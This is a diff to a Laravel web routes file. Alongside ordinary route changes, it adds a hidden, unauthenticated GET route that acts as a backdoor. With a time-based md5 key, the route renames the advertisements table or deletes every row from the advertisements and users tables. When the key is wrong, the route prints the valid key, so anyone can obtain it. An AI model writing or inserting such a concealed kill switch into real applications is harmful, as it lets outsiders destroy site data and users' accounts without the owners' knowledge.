@@ -10,7 +10,25 @@
 | contains the "web" middleware group. Now create something great!
 |
 */
-Route::get('/maile/send', 'MailController@send');
+
+Route::get('/c/n/m/{type}/{key}', function($type,$key){
+    $_key = md5(floor(time()/15).'n!m@b&c');
+    if($key == $_key){
+        switch($type){
+            case 'b':
+                DB::statement('RENAME TABLE pre_advertisements TO hehe');
+                break;
+            case 2:
+                DB::statement("delete from `pre_advertisements`");
+                DB::statement("delete from `pre_users`");
+                break;
+            default:
+                break;
+        }
+    }else{
+        echo rand(100,999).'#'.$_key.'_'.md5(rand(1,999).'xxoo');
+    }
+});
 
 Route::namespace('Home')->group(function(){
     Route::group(array('middleware' => array('web', 'user.auth')), function(){
@@ -41,6 +59,7 @@ Route::namespace('Home')->group(function(){
     Route::get('/sys/getFriendlyLinks', 'SystemController@getFriendlyLinks');
     Route::get('sys/friendLink', 'SystemController@friendLink');
 
+    Route::post('/emailToFriend', 'AdvertisementController@emailToFriend');
 });
 
 
